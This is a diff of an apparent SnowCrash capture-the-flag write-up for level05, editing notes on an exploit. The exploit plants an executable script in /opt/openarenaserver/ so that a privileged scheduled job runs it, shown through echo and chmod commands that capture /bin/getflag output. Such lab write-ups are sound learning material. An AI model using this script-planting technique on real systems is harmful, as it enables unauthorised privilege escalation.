@@ -49,7 +49,7 @@ What this script does:
 
 Exploit
 - put a script inside `/opt/openarenaserver/` 
-- use `tee` : _read stdin and write to stdout and files_
+- ~~use `tee` : _read stdin and write to stdout and files_~~
 - let it be run in 2min 
 
 ```bash
@@ -58,6 +58,6 @@ level05@SnowCrash:~$ echo '/bin/getflag > /tmp/temp' \
 chmod +x /opt/openarenaserver/solve.sh
 
 # remember
-# `/usr/sbin/openarenaserver` runs `bash -x "$i"` in a subshell
-# it won't stdout anything whether we use `tee` `tee /dev/tty` or `sync` 
+# `/usr/sbin/openarenaserver` runs `bash -x` in a subshell
+# it'll stdout nothing whether we `tee` `tee /dev/tty` or `sync` 
 ```
